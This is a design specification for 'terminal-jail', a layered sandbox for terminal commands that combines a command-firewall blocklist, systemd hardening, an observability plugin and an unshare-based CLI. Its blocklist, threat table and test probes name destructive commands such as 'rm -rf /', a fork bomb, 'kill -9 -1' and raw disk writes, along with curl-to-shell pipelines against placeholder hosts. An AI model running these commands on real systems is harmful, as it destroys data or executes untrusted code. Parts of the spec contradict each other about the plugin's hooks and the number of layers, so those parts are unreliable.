# Terminal-Jail Integration Specification

## Purpose

Terminal-jail is a defense-in-depth containment system for terminal commands. It uses four independently deployable layers with a clear architectural split:

1. **Interruptor Bash engine** — the innermost layer. A user-space command firewall that evaluates every command string against a rule engine before execution. Provides three verdicts: `allow` (pass through), `block` (reject with error), and `modify` (rewrite command, e.g., wrap in sandbox). 30 built-in rules across three categories (critical blocklist, auto-sandbox, always-allow) with support for user-defined YAML rules. Operates on parsed shell syntax — pipes, redirects, command substitution, heredocs, and variable expansion are all tokenized before evaluation.
2. **systemd service hardening** — the `90-terminal-jail-hardening.conf` drop-in for `hermes-gateway.service`. This is a LIGHTWEIGHT hardening layer (4 active directives: `ProtectProc=invisible`, `NoNewPrivileges=true`, `ProtectControlGroups=true`, `TasksMax=256`). The stronger directives (`PrivateUsers`, `RestrictNamespaces`, `RestrictAddressFamilies`, `ProtectSystem=strict`, `ProtectHome=true`) are staged — commented out pending per-host verification (see `systemd/90-terminal-jail-hardening.conf` and `specs/systemd.md`). As shipped, the drop-in does NOT create a PID namespace; it constrains process visibility, privileges, cgroups, and task count. These are kernel-enforced and cannot be bypassed by command syntax.
3. **Hermes plugin** — observability layer. Registers `pre_tool_call` (visibility into terminal commands) and `transform_terminal_output` (output annotation) hooks. The plugin does NOT wrap commands — Hermes core has no pre-execution command-transform hook. The plugin provides metrics, logging, and operational visibility. Command wrapping functions (`transform_command`, `transform_exec_command`) were removed from the plugin on 2026-08-07 (TJ-GAP-010) as dead code: they were never wired to any execution path, so the plugin is observability-only.
4. **Standalone CLI** — the `terminal-jail` Bash wrapper for commands launched manually or by non-Hermes automation. Integrates the interruptor as its command-evaluation front-end (enabled by default via `--interruptor` flag). Wraps commands in `unshare --pid --fork --mount-proc --kill-child=SIGKILL`. This is the only component that performs PID namespace wrapping at the command level.

No layer is assumed to be perfect or universally available. The intended security property is that a command must bypass *multiple, differently implemented enforcement points* to affect the host, other users' processes, host-visible files, or the network.

This document specifies how the layers compose, the threats they address, failure/degradation behavior, installation and upgrade order, and validation of the complete stack.

### Architectural decision: Interruptor + systemd defense-in-depth (Phase 11)

Hermes core has no pre-execution command-transform hook. The plugin's `pre_tool_call` hook only supports block/allow decisions — it cannot modify command strings. The `transform_command` and `transform_exec_command` functions could not be wired to Hermes command execution without a core change; they were removed from the plugin as dead code on 2026-08-07 (TJ-GAP-010).

**Resolved architecture (Phase 11 — Interruptor):** A user-space command firewall (the Interruptor Bash engine) now sits as the innermost pre-execution layer. It evaluates every command against 30 built-in rules (critical blocklist, auto-sandbox, always-allow) using parsed shell syntax rather than raw string matching. The interruptor is integrated into the standalone CLI (`--interruptor` flag, enabled by default) via a JSON-protocol bridge (`interruptor_bridge.py`). PID namespace isolation is provided by the standalone CLI (`unshare`) and, on hardened deployments, by a full-profile systemd configuration; the shipped drop-in is lightweight (`ProtectProc=invisible`, `NoNewPrivileges=true`, `ProtectControlGroups=true`, `TasksMax=256`) with `PrivateUsers`/`RestrictNamespaces` staged commented-out pending verification. The plugin provides observability only — metrics, logging, and operational visibility.

The four layers now compose as: **Interruptor** (pre-execution command firewall) → **systemd** (kernel-enforced PID isolation) → **plugin** (observability) → **CLI** (portable unshare fallback). A command must bypass all four independently implemented enforcement points to affect the host.

Two Hermes core changes have been explored to restore command-level wrapping inside Hermes itself:
- **HOOK-GAP-01 (PR #68216):** `--sandbox` flag adding `terminal.jail_enabled` config key — wraps at the terminal backend layer (`tools/environments/local.py`), not the plugin layer.
- **HOOK-GAP-02:** Backend-layer wrapping via `HERMES_TERMINAL_JAIL_ENABLED` env var in `_run_bash()`.

Neither is merged upstream as of v1.0.0. The systemd + Interruptor architecture is the production deployment path.

## Security goals

The full stack is designed to:

- evaluate every command against a rule engine BEFORE execution, blocking destructive patterns at the shell syntax level;
- prevent recursive root filesystem removal (`rm -rf /`), mass process kill (`kill -9 -1`), and fork bombs via pattern matching;
- wrap build/test/package commands (`pytest`, `npm test`, `go test`, `make`, `pip install`, `cargo build`, `gcc`, script execution) in an auto-sandbox namespace without user intervention;
- block download-to-shell pipelines (`curl | sh`, `wget | bash`) at the shell syntax level before execution;
- prevent commands in a contained session from signaling or killing host processes;
- limit blast radius from accidental destructive commands such as `killpg`, `killall`, and `pkill`;
- contain process multiplication and reduce fork-bomb impact;
- prevent privilege gain by processes started from the Hermes gateway;
- reduce visibility into unrelated host processes through `/proc`;
- restrict package-install and shell-pipeline malware from modifying host-visible files;
- prevent sandboxed processes from opening arbitrary network sockets;
- retain useful command execution in environments where one or more enforcement mechanisms are unavailable.

## Non-goals and assumptions

Terminal-jail is a containment boundary, not a complete host security architecture.

- It does not make untrusted native code safe against a kernel exploit.
- It does not remove trust from the account running `hermes-gateway.service`; correct systemd service identity and file ownership remain prerequisites.
- It does not prevent all data exfiltration if a permitted network path, mounted secret, host IPC mechanism, or credential is deliberately exposed to the sandbox.
- It does not protect commands intentionally run outside both the Hermes plugin and `terminal-jail` CLI.
- It does not replace image hardening, dependency provenance, secret management, mandatory access control, patching, logging, or monitoring.
- `unshare` isolation requires kernel/user-namespace support and an implementation that verifies requested namespaces were actually created.
- The exact availability of filesystem, PID, and mount isolation depends on the flags and mounts selected by the plugin and CLI implementations. This specification requires their policy to be equivalent where both are available.

## Layer composition

```mermaid
flowchart TB
    U[Command source]
    H[Hermes session]
    M[Manual shell / automation]

    M --> I[Interruptor Bash engine\nCOMMAND FIREWALL\nstdin/stdout JSON bridge]
    I -->|block| BLOCKED[BLOCKED — exit 126]
    I -->|allow| C[terminal-jail CLI\nBash wrapper]
    I -->|modify| C

    H --> P[Hermes plugin\nOBSERVABILITY ONLY\npre_tool_call + transform_terminal_output]
    H -->|terminal command\nunwrapped| EXEC[Hermes terminal execution]

    C -->|wrap command| US2[unshare sandbox]

    subgraph S[hermes-gateway.service]
      P
      EXEC
    end

    SD[systemd drop-in\n90-terminal-jail-hardening.conf]
    SD -->|PrivateUsers (staged)| S
    SD -->|ProtectProc=invisible| S
    SD -->|NoNewPrivileges| S
    SD -->|TasksMax| S
    SD -->|RestrictAddressFamilies (staged)| S

    US2 --> K[Kernel namespace and mount enforcement]
    SD --> K

    K --> R[Contained command execution]
```

### Composition rules

| Layer | Entry point covered | Primary enforcement | Independent value |
|---|---|---|---|---|
| Interruptor Bash engine | Commands entering the standalone CLI | Rule-engine command evaluation (30 built-in rules: critical blocklist, auto-sandbox, always-allow) with parsed shell syntax | First line of defense against destructive shell commands (rm -rf /, fork bombs, kill -9 -1). Blocks before any namespace or syscall boundary is crossed. |
| systemd drop-in | The Hermes gateway process tree and all descendants | Lightweight hardening: process visibility (`ProtectProc=invisible`), privilege (`NoNewPrivileges=true`), cgroup protection (`ProtectControlGroups=true`), task budget (`TasksMax=256`). Stronger directives (`PrivateUsers`, `RestrictNamespaces`) are staged commented-out pending per-host verification. | Applies regardless of command syntax, cannot be bypassed by shell metacharacters. Process-visibility/privilege containment, not a PID namespace boundary as shipped. |
| Hermes plugin | Commands launched by Hermes terminal sessions | Observability only: command visibility (`pre_tool_call`), output annotation (`transform_terminal_output`), metrics export | Provides operational visibility, metrics, and logging for terminal commands. Does NOT wrap commands — Hermes core lacks a pre-execution command-transform hook. |
| Standalone CLI | Interactive commands and scripts explicitly invoked as `terminal-jail ...` | `unshare` PID namespace sandbox equivalent to the intended plugin behavior | Provides PID namespace isolation outside systemd contexts (Docker, manual use). Only component that performs command-level `unshare` wrapping. |

The systemd layer provides process-visibility/privilege/cgroup hardening for the gateway service process tree (4 active directives: `ProtectProc=invisible`, `NoNewPrivileges=true`, `ProtectControlGroups=true`, `TasksMax=256`). It is attached to the service process tree and cannot be bypassed merely by supplying a different executable, a shell metacharacter sequence, or a direct binary path. The plugin provides observability on top of systemd hardening — it sees what commands run but does not modify them.

The CLI provides PID namespace isolation for contexts where systemd is unavailable (Docker without systemd, manual host-shell use). A manual command launched through `terminal-jail` receives CLI namespace confinement; if that command is launched from a process already in the hardened gateway service, systemd controls also apply.

The three layers compose as: systemd hardens the gateway service tree (process visibility, privilege, cgroup budget) → plugin observes and reports → CLI provides PID namespace isolation as a portable fallback for non-systemd contexts.

## Control mapping and attack coverage

### PID namespace containment: `killpg`, `killall`, and `pkill`

The layers participate in protection against indiscriminate process signaling as follows:

- The **systemd drop-in** provides `ProtectProc=invisible` (filtered /proc view) and `NoNewPrivileges=true`; the stronger `PrivateUsers` (user namespace isolation) and `RestrictNamespaces` (prevents creating new namespaces to escape) directives are staged — commented out pending per-host verification, so the shipped drop-in is NOT a PID namespace boundary. It constrains the entire gateway process tree via process-visibility, privilege, cgroup, and task-count limits.
- The **Hermes plugin** provides observability: it sees terminal commands via `pre_tool_call` but does NOT wrap them. Former wrapping functions were removed as dead code (v1.1.x, TJ-GAP-010 — see HOOK-GAP-03 above).
- The **`terminal-jail` CLI** uses `unshare` PID namespace isolation for manual invocation. This is the only component that performs command-level PID namespace wrapping.

Inside a correctly created PID namespace, process-discovery and signal tools only see processes in that namespace. `killpg(1)`, `killall`, and `pkill` therefore cannot target arbitrary host process groups or host PIDs that are not namespace-visible. A process can still signal processes within its own namespace when ordinary Unix permission rules allow it. This is expected: PID namespaces reduce host blast radius; they do not prohibit process management inside the sandbox.

### Fork bombs

The systemd layer provides `TasksMax` for `hermes-gateway.service`, constraining the number of tasks the gateway service cgroup may create. This is the primary quantitative backstop against process exhaustion from a fork bomb or aggressive worker spawning.

The `terminal-jail` CLI provides PID namespace isolation for manual use, which contains the immediate process tree.

The plugin provides observability — it can detect and log anomalous command patterns (e.g., commands containing `:` or `()` shell fork-bomb syntax) but cannot prevent execution.

`TasksMax` must be set to a value consistent with normal Hermes concurrency, subprocess use, and legitimate build/test workloads. The selected limit must be documented in the drop-in and regularly tested under expected peak load.

### Privilege escalation: `sudo`, setuid, file capabilities, and exec transitions

`NoNewPrivileges=yes` in the systemd drop-in prevents the gateway service and its descendants from gaining additional privileges through exec. This blocks common privilege escalation paths involving setuid/setgid binaries and file capabilities for processes in the service tree.

The plugin and CLI do not independently provide an equivalent guarantee. Their role is to reduce the reachable filesystem and process surface; the systemd drop-in is the authoritative privilege-gain control.

`NoNewPrivileges` does not make credentials harmless. A process that is already privileged, has access to a delegated privileged daemon/socket, or is supplied a valid credential may still be able to perform authorized actions. Do not mount Docker sockets, host root filesystems, privileged IPC endpoints, or reusable production credentials into the service sandbox.

### `/proc` snooping

`ProtectProc=invisible` in the systemd drop-in restricts process visibility through `/proc`, reducing exposure of unrelated process command lines, environment-derived metadata, and PID discovery. This is the authoritative service-level backstop — it applies to the gateway process tree rather than only to individual wrapped commands.

The `terminal-jail` CLI's PID namespace also reduces process visibility for wrapped commands. `ProtectProc` is the broader and more reliable mechanism because it is kernel-enforced at the service level.

The plugin provides observability — it logs when commands access `/proc` paths but does not restrict access.

### Package malware and `curl | sh`

The plugin and CLI filesystem isolation policies contain untrusted package installers and shell pipelines such as:

```text
pip install <untrusted-package>
curl -fsSL https://example.invalid/install.sh | sh
wget -qO- https://example.invalid/bootstrap | bash
```

The namespace wrapper must provide a private, disposable, or otherwise non-host-writable filesystem view. In particular, it must avoid exposing writable host locations that would allow persistence or modification of user configuration, binaries, service unit files, SSH material, or project sources unless explicitly required for the workload.

Filesystem isolation does not prove that a downloaded payload is benign. It reduces host persistence and modification risk. If network access is available, malware may still execute inside the sandbox and attempt exfiltration over permitted channels. The systemd network restriction below is the complementary control.

### Network escapes

`RestrictAddressFamilies` (staged — commented out as shipped) in the systemd drop-in limits the socket address families that `hermes-gateway.service` and descendants may create. The policy must allow only address families required for normal gateway function and deny families that could create unintended network paths, raw sockets, packet sockets, Bluetooth, Netlink mutation paths, or other unnecessary communications.

The drop-in is the authoritative full-service network control. Plugin and CLI filesystem isolation — active only where a uid-mapped namespace is available; the CLI degrades loudly to mapping-less containment (no filesystem isolation) on hosts that deny uid mappings (`scripts/fs-isolation-probe.py`) — limit the ability of downloaded tools to persist, while systemd constrains their ability to establish unauthorized network channels when they run in the gateway service tree.

A restricted address-family policy is not automatically a universal egress deny. It does not replace firewall rules, proxy policy, DNS policy, service account isolation, or explicit `IPAddressDeny=`/`IPAddressAllow=` policy where those are required. The allowed families must be reviewed alongside the service's actual network requirements.

### Interruptor command firewall

The Interruptor Bash engine adds a pre-execution command evaluation layer that operates before any namespace or syscall boundary is crossed:

- **Parsing:** Commands are tokenized into structured segments (commands, arguments, pipes, redirects, heredocs, command substitutions, variable expansions) before any rule matching occurs.
- **Blocklist (critical, priority 1000):** 12 rules that always block — recursive root deletion (`rm -rf /`), fork bombs (`:(){ :|:& };:`), mass process kill (`kill -9 -1`), process-group kill targeting PID 1 or own process group (`killpg`/`kill` on 0/1), raw device writes (`dd if=/... of=/dev/sda`), filesystem creation (`mkfs.*`), partition manipulation (`fdisk`), world-writable root (`chmod 777 /`), output redirection to system paths (`echo ... > /etc/...`), download-to-shell pipes (`curl | sh`, `wget | bash`), privilege escalation (`sudo`), and code-injection vectors in interpreter arguments (`os.system(`, `subprocess.run(`, `eval(`, `exec(` — scanned in quoted interpreter code too, TJ-GAP-042). They cannot be removed; a same-ID user rule may downgrade one to `warn` only.
- **Auto-sandbox (priority 700):** 8 rules that wrap commands in an unshare PID namespace — test runners (`pytest`/`tox`/`nose`, `npm test`/`npx vitest`/`npx jest`, `go test`), build tools (`make`, `cargo build`/`cargo test`, `gcc`/`g++`/`clang++`), package installers (`pip install`), and script execution (`./foo.sh`, `./foo.py`, `./foo.rb`). The command is rewritten as `unshare --user --pid --fork bash -c '...'`. Plain network downloads (`curl -o`, `wget`), package-manager updates (`apt-get update`), and container queries (`docker ps`) are NOT auto-sandboxed; the only network-pipeline protection is the blocklist rule for download-to-shell pipes (`curl | sh`, `wget | bash`) above.
- **Allowlist (priority 500):** 10 rules that always pass — `echo`, `ls`, `pwd`, `cd`, `which`/`command -v`, `grep`, `find` (without `-exec`/`-delete`), `cat` on non-sensitive paths (excluding `/etc`, `/boot`, `/proc`, `/sys`), `git status`/`log`/`diff`, and `python ... --version`.
- **User rules (future):** Loaded from `/etc/terminal-jail/rules.d/` and `~/.config/terminal-jail/rules.d/` in lexical order with user rules overriding system rules.
- **Mode switching:** `TERMINAL_JAIL_INTERRUPTOR_MODE` env var controls behavior — `enforce` (default, blocks violating commands), `warn` (logs blocks but allows), `disabled` (pass-through).

## Threat model

| Attack vector | Layer(s) that block or contain it | How protection works | Plausible bypass scenario | Residual risk |
|---|---|---|---|---|
| `killpg(1)` targeting the host process group | Plugin, CLI, systemd-composed stack | Plugin/CLI PID namespaces limit visible target processes; systemd constrains the gateway service tree. | Command is run outside both wrappers; namespace creation silently fails; attacker controls a privileged host process. | Sandboxed processes may still kill their own namespace processes; host kernel vulnerabilities remain out of scope. |
| `killall -9 bash` or equivalent broad-name signaling | Plugin, CLI, systemd-composed stack | PID namespace makes unrelated host `bash` processes unavailable to name-based process discovery. | Wrapper is bypassed, malformed, or fails open; the target is in the same namespace. | In-namespace processes with matching names can be killed. |
| `pkill -f hermes` | Plugin, CLI, systemd-composed stack | PID namespace hides host/gateway process targets from the wrapped command; service hardening limits impact on gateway descendants. | Command is launched directly on host; `/proc` or PID namespace policy is absent; legitimate target resides in sandbox. | Denial of service remains possible against sandbox-local processes. |
| Fork bomb / excessive subprocess spawning | Plugin, CLI, systemd | PID namespace contains scope; systemd `TasksMax` caps task creation in `hermes-gateway.service`. | Attack runs outside hardened service; `TasksMax` is unset/too high; host-wide PID limits are weak. | The service can still consume up to its configured task and CPU/memory allocation; use system resource controls and monitoring. |
| `sudo`, setuid binary, file capability privilege gain | systemd | `NoNewPrivileges=yes` prevents gaining privilege across exec in the service tree. | Process starts already privileged; service exposes privileged IPC/socket; administrator intentionally permits escalation. | Valid credentials and authorized privileged services remain powerful; do not expose them. |
| `/proc` inspection of unrelated processes | systemd, plugin, CLI | `ProtectProc` hides/restricts process metadata; PID namespace narrows wrapped command visibility. | Systemd is unavailable/misconfigured; command runs outside service and wrappers; host permits alternative observability interfaces. | Metadata for permitted/same-namespace processes may remain visible. |
| Malicious `pip` package modifies host files | Plugin, CLI; systemd reduces service privilege | Filesystem namespace/mount policy prevents writes to host-visible persistent paths. | Writable host bind mount, home directory, project directory, cache, socket, or shared volume is exposed; command is run outside wrapper. | Payload can alter sandbox-visible data or build artifacts intentionally mounted writable. |
| `curl | sh` persistence or bootstrap script | Plugin, CLI; systemd (privilege hardening only) | Plugin/CLI interruptor blocklists reject download-to-shell pipelines before execution; systemd provides no filesystem isolation as shipped (`ProtectSystem=strict`/`ProtectHome=true` commented out) — `NoNewPrivileges` limits escalation only. | Internet access and a writable shared host mount remain available; direct host shell is used. | Payload can execute in sandbox and attack allowed resources. |
| Network escape, arbitrary socket creation | systemd | `RestrictAddressFamilies` (staged — commented out as shipped) denies unnecessary socket families for the service process tree when enabled. | Required `AF_INET`/`AF_INET6` is allowed and no egress firewall exists; command runs outside service. | Traffic over allowed families/endpoints can remain possible; apply egress filtering for stronger control. |
| Namespace escape via kernel vulnerability | None fully; all reduce attack surface | Layering reduces privileges, files, process visibility, and networking available to exploit code. | Exploit targets vulnerable kernel or privileged helper. | Kernel compromise is high impact; patch kernel, minimize exposed namespaces/capabilities, use MAC/VM boundaries for hostile code. |
| Direct manual command not prefixed with `terminal-jail` | Plugin only for Hermes; otherwise none | Hermes plugin catches commands issued through Hermes. | User runs a command in an ordinary host shell outside Hermes and without CLI. | Full host impact is possible; provide shell aliases, documentation, training, and consider stronger account/container isolation. |
| Plugin disabled or unavailable | CLI and systemd where used | CLI explicitly wraps manual calls; systemd continues hardening the gateway service. | Manual command bypasses CLI; Docker lacks systemd. | Namespace containment depends on operator use of CLI. |
| systemd absent, including many Docker deployments | Plugin and CLI | Both wrappers can still use `unshare` namespace containment independently; filesystem isolation only where the host permits a uid mapping (see `scripts/fs-isolation-probe.py`). | `unshare` is unavailable or unsupported; wrapper fails open. | No `NoNewPrivileges`, `ProtectProc`, `TasksMax`, or address-family restriction from systemd. |
| `unshare` unavailable or not on `PATH` | Graceful degradation logic in all layers | Layer detects unavailability and follows the configured fail-safe policy rather than executing an unexpectedly unsandboxed command. | Implementation fails open by blindly executing original command. | If policy allows execution, no namespace containment exists; systemd controls may still apply for Hermes gateway. |

## Graceful degradation

Graceful degradation means that a missing optional layer must be detectable, logged, and handled according to an explicit policy. It must never be mistaken for successful sandboxing.

The default security posture for commands explicitly requested to be sandboxed is **fail closed**: if the wrapper cannot establish required isolation, it returns a clear error and does not run the original command. Administrators may choose an explicitly documented development-only fail-open mode, but it must produce a prominent warning identifying the missing control and must never be the silent default.

### Graceful degradation matrix

| Condition | Plugin behavior | CLI behavior | systemd behavior | Effective protection | Required operator action |
|---|---|---|---|---|---|---|
| All layers installed and healthy | Observes Hermes terminal commands via `pre_tool_call`; annotates output via `transform_terminal_output`. Does NOT wrap commands. | Wraps explicit manual invocations in `unshare` PID namespace. | Applies service-level hardening (`ProtectProc=invisible`, `NoNewPrivileges`, `ProtectControlGroups`, `TasksMax`); `PrivateUsers`/`RestrictNamespaces` staged commented-out. | Defense-in-depth: interruptor firewall; CLI provides PID isolation; plugin provides observability; systemd provides process-visibility/privilege hardening. | Run periodic verification checklist. |
| Plugin not installed or disabled | Hermes commands are not observed or annotated. | `terminal-jail ...` still supplies namespace containment (+ filesystem isolation where the host permits a uid mapping) for commands explicitly invoked through it. | Still constrains `hermes-gateway.service` if deployed. | CLI plus service hardening; plugin observability is lost. | Install/repair plugin to restore metrics and logging. |
| CLI not installed or not used | Plugin observes Hermes commands. | No protection for ordinary manual host-shell commands. | Still constrains gateway process tree. | Systemd hardening plus plugin observability for Hermes sessions only. | Install CLI for manual/high-risk work outside Hermes. |
| systemd unavailable, such as Docker without systemd | Plugin observes Hermes commands but does not wrap them. | CLI still wraps commands if `unshare` is available. | Drop-in cannot apply. | CLI `unshare` isolation only; no systemd-level `NoNewPrivileges`, `ProtectProc`, `TasksMax`, or `RestrictAddressFamilies` (staged — commented out as shipped). | Use container runtime controls (`--pids-limit`, read-only filesystem, dropped capabilities, seccomp, network policy) or run under a systemd-enabled host. |
| `unshare` not on `PATH` | Plugin observes but does not wrap (regardless of unshare availability). | Detect before executing. Required-isolation mode returns an actionable error. | Systemd hardening remains active for the gateway service. | systemd-only for Hermes gateway; no CLI wrapper available. | Install/configure `unshare` from util-linux, correct `PATH`, and verify namespace support. |
| `unshare` exists but required namespace creation fails | Plugin observes but does not wrap. | Do not run original command in fail-closed mode. | Systemd hardening remains active for service tree. | Same as prior row unless an explicitly approved development fail-open policy is selected. | Diagnose kernel/user namespace policy, required permissions, and mount setup. |
| Manual command is run directly outside Hermes and without CLI | Not in path. | Not in path. | Not in path unless the shell itself belongs to hardened gateway service. | None of terminal-jail's normal controls. | Use `terminal-jail`, a dedicated unprivileged account/container, or another approved execution environment. |

### Required `unshare` failure semantics

Every wrapper implementation must:

1. resolve `unshare` using an absolute configured path or a verified `PATH` lookup before accepting a command;
2. verify that required `unshare` flags and namespace operations succeed;
3. emit a concise diagnostic naming the missing binary, unsupported kernel setting, permission failure, or mount failure;
4. exit non-zero without running the original command when required isolation cannot be established;
5. avoid shell constructions that retry the original command outside the namespace after a failed `unshare` invocation;
6. make any development-only fail-open switch explicit, opt-in, auditable, and unavailable in production service configuration;
7. record a structured log/metric for failed isolation setup so health monitoring can detect coverage loss.

## Installation procedure

Install from the outermost, service-wide backstop inward:

1. **systemd hardening drop-in**
2. **Hermes plugin**
3. **standalone CLI**

This order matters because it establishes the broadest protection before enabling new execution paths. The systemd drop-in hardens the gateway process tree even if plugin configuration is incomplete, a command transform is faulty, or an operator invokes a binary unexpectedly from inside the service. Installing the plugin next provides automatic coverage for normal Hermes sessions. Installing the CLI last provides an explicit and documented manual-use escape from unsafe direct host-shell execution, without being relied on as the only protection for the gateway.

### Prerequisites

Before installation, confirm that:

- the host runs systemd if service hardening is expected;
- `hermes-gateway.service` is the correct unit name and is managed by systemd;
- `unshare` is installed from util-linux and executable by the relevant service/user account;
- required user and mount namespace features are supported by the kernel and permitted by local policy;
- the gateway service runs as a dedicated, unprivileged account where possible;
- no unnecessary host paths, Docker sockets, credentials, SSH agents, or privileged IPC sockets are exposed to the gateway;
- expected normal workloads are known so `TasksMax` and filesystem mounts do not break legitimate operation.

### Step 1: install and activate the systemd drop-in

1. Place `90-terminal-jail-hardening.conf` in the `hermes-gateway.service.d` drop-in directory used by the deployment.
2. Review the drop-in against the gateway's real operational requirements. In particular, validate `NoNewPrivileges`, `ProtectProc`, `TasksMax`, and `RestrictAddressFamilies` (staged — commented out as shipped) rather than weakening them preemptively.
3. Reload systemd manager configuration.
4. Restart `hermes-gateway.service` in a controlled maintenance window.
5. Inspect the effective unit configuration and service status to confirm the drop-in is loaded.
6. Run the systemd verification commands in this document before proceeding.

Do not continue to plugin rollout if the drop-in is syntactically invalid, not loaded by the target unit, or materially reduces the security score below the required baseline without an approved exception.

### Step 2: install and configure the Hermes plugin

1. Install the terminal-jail Hermes plugin through the approved Hermes plugin mechanism.
2. Configure its `terminal.command.transform` hook to invoke the validated `unshare` wrapper policy.
3. Ensure the plugin runs in fail-closed mode for required isolation and emits a meaningful error when `unshare` is unavailable.
4. Restart or reload the Hermes component required for plugin discovery.
5. Verify that a newly created Hermes session, not merely an already-running session, loads the plugin.
6. Run the plugin verification checklist.

The plugin must preserve command argument boundaries. It must not interpolate a complete shell command through unsafe string concatenation, and it must not permit user-controlled values to alter the wrapper's namespace flags or mount policy.

### Step 3: install the standalone CLI

1. Install the `terminal-jail` executable in a root-owned or otherwise trusted directory on `PATH`.
2. Verify that it resolves the intended `unshare` binary and does not honor unsafe environment-controlled wrapper paths.
3. Document its use for interactive shells, automation, and emergency/manual operations.
4. Optionally provide a shell alias or approved workflow integration, but do not let an alias obscure whether a command was actually sandboxed.
5. Run the CLI verification checklist.

The CLI must pass commands and arguments without lossy re-parsing. The documented interface must make clear whether the command is supplied as argv or a quoted shell snippet, and shell execution must be avoided unless explicitly required and safely handled.

## Upgrade procedure

Upgrade in a controlled sequence that avoids a coverage gap:

1. Review release notes, diffs, and compatibility notes for the systemd drop-in, plugin, CLI, and their `unshare` flags/mount policy.
2. Back up current configuration and record the effective systemd unit settings and plugin configuration. Do not back up or print secrets as part of this process.
3. Upgrade the systemd drop-in first. Reload manager configuration and restart the service only after validating unit syntax and required service dependencies.
4. Verify systemd hardening and normal gateway startup.
5. Upgrade the Hermes plugin and reload/restart the relevant Hermes component.
6. Verify plugin transformation in a fresh Hermes session.
7. Upgrade the CLI binary/script.
8. Verify CLI behavior and argument handling.
9. Execute the full-stack end-to-end test strategy in a non-production environment.
10. Monitor structured errors, service restarts, task-limit events, denied syscall/socket events, and user reports after rollout.

### Rollback procedure

Rollback must preserve the outer service boundary where possible:

1. If a plugin or CLI regression occurs, disable or revert that component while leaving the validated systemd hardening drop-in active.
2. If systemd hardening causes an availability incident, identify the specific incompatible directive and apply the narrowest temporary exception; do not remove the entire drop-in as a first response.
3. Document any temporary reduction in score or coverage, its owner, and an expiry/review date.
4. Re-run all verification checks after rollback to establish the actual remaining protection level.

## Verification checklist

Verification must be run from a controlled non-production environment first. A command returning an error is only meaningful when the error demonstrates sandbox isolation rather than a missing executable, malformed invocation, or service outage. Capture exit code, stderr, and relevant service logs.

### A. Prerequisite and policy checks

- [ ] Confirm `unshare` is available to the Hermes service account and to CLI users.
- [ ] Confirm the plugin and CLI use the same approved namespace and filesystem-isolation policy.
- [ ] Confirm fail-closed behavior when `unshare` cannot be resolved or namespace setup fails.
- [ ] Confirm the gateway service runs under the intended unprivileged account.
- [ ] Confirm no unintended writable host mounts, secrets, Docker socket, or privileged IPC endpoint is exposed to sandboxed commands.
- [ ] Confirm the effective systemd unit includes the terminal-jail drop-in.

### B. Hermes plugin verification

Run the required behavioral probe in a fresh Hermes session:

```text
hermes chat -q "pkill -f hermes"
```

Expected result:

- The command returns an error/non-zero outcome attributable to the sandboxed command being unable to target host-visible Hermes processes.
- The Hermes gateway remains healthy and continues serving subsequent benign requests.
- Logs show that the terminal command transform was applied and, where supported, identify the namespace wrapper execution without exposing sensitive command data unnecessarily.

Additional recommended plugin probes:

- [ ] Run `ps` or a narrowly scoped process-list command in the transformed session and confirm it does not expose unrelated host processes.
- [ ] Attempt a write to a known non-sandbox host path that policy should make unavailable; confirm failure and confirm the host file remains unchanged.
- [ ] Attempt a benign child-process fan-out sized below `TasksMax`; confirm normal execution.
- [ ] Verify command arguments containing spaces, quotes, glob characters, and leading dashes are passed intact and cannot alter wrapper flags.
- [ ] Temporarily test missing `unshare` in an isolated test configuration and confirm the plugin returns a clear error rather than running the command on the host.

Do not use a probe that can terminate the actual gateway or production shell even if isolation fails. In production-like testing, replace destructive target patterns with a disposable process created solely for the test namespace.

### C. Standalone CLI verification

Run the required behavioral probe:

```text
terminal-jail "killall -9 bash"
```

Expected result:

- The command returns an error/non-zero outcome because host `bash` processes are not visible/targetable from the jailed PID namespace, or because no matching in-namespace process exists.
- The invoking host shell remains alive.
- The CLI reports a setup failure instead of executing unsandboxed if `unshare` is unavailable.

Additional recommended CLI probes:

- [ ] Run a process listing inside `terminal-jail` and confirm that unrelated host processes are absent.
- [ ] Attempt to write to a policy-prohibited host location and confirm it fails; independently inspect the location from the host to confirm no modification.
- [ ] Run a harmless `pip` install or simulated installer in a disposable fixture and confirm package/cache writes remain inside the intended sandbox-visible paths.
- [ ] Use an argument-preservation test with spaces, quotes, dollar signs, semicolons, glob patterns, and an argument beginning with `-`.
- [ ] Test missing `unshare` with a test-only PATH and confirm non-zero fail-closed behavior.

### D. systemd hardening verification

Run the required security assessment:

```text
systemd-analyze security hermes-gateway.service
```

Expected result:

```text
Overall exposure level: ...
```

The assessed security score for `hermes-gateway.service` must be **at least 9.0** on the 0–10 exposure scale — for the **staged full profile** (all 12 directives active after per-host verification). A deployment running the shipped lightweight baseline (4 active directives) is exempt from the 9.0 target; record its pre-deployment vs post-deployment score and require no regression. See the `[shipped] baseline` / `[staged] full profile` split in `specs/systemd.md`. Record the exact score, systemd version, and any warnings because scoring heuristics can differ between systemd releases.

Also verify:

- [ ] The effective unit configuration contains `NoNewPrivileges=yes`.
- [ ] The effective unit configuration contains the intended `ProtectProc` setting.
- [ ] The effective unit configuration contains a non-default, documented `TasksMax` value appropriate to the service.
- [ ] The effective unit configuration contains the intended `RestrictAddressFamilies` (staged — commented out as shipped) allowlist/deny policy when the directive is enabled.
- [ ] A test process launched through the gateway cannot gain privilege through a setuid/file-capability path.
- [ ] A test process cannot inspect unrelated `/proc` entries beyond the selected `ProtectProc` policy.
- [ ] Task-limit events are observable in journal/service monitoring when a controlled test reaches the limit.
- [ ] Socket-creation attempts using an intentionally disallowed address family fail and are observable in logs/audit where available.
- [ ] Normal gateway operations still succeed under the restrictions.

### E. Full-stack verification

- [ ] Start a fresh non-production gateway instance with the systemd drop-in active.
- [ ] Confirm the plugin is loaded in that instance.
- [ ] Execute the required plugin probe: `hermes chat -q "pkill -f hermes"`.
- [ ] Execute the required CLI probe: `terminal-jail "killall -9 bash"`.
- [ ] Confirm `systemd-analyze security hermes-gateway.service` reports a score of at least 9.0 — **full-profile deployments only**; shipped-baseline deployments confirm no score regression instead (see `specs/systemd.md`).
- [ ] Confirm the host shell, gateway service, and a known unrelated host process remain healthy after all probes.
- [ ] Confirm service logs contain no failed-open namespace initialization event.
- [ ] Confirm no test artifact persists outside approved disposable test paths.

### F. Interruptor verification

The interruptor operates as a pre-execution command firewall. Verify its rule engine and CLI integration:

- [ ] Run a blocked command pattern through the CLI and confirm exit 126 with formatted block output: `terminal-jail --interruptor "rm -rf /"`.
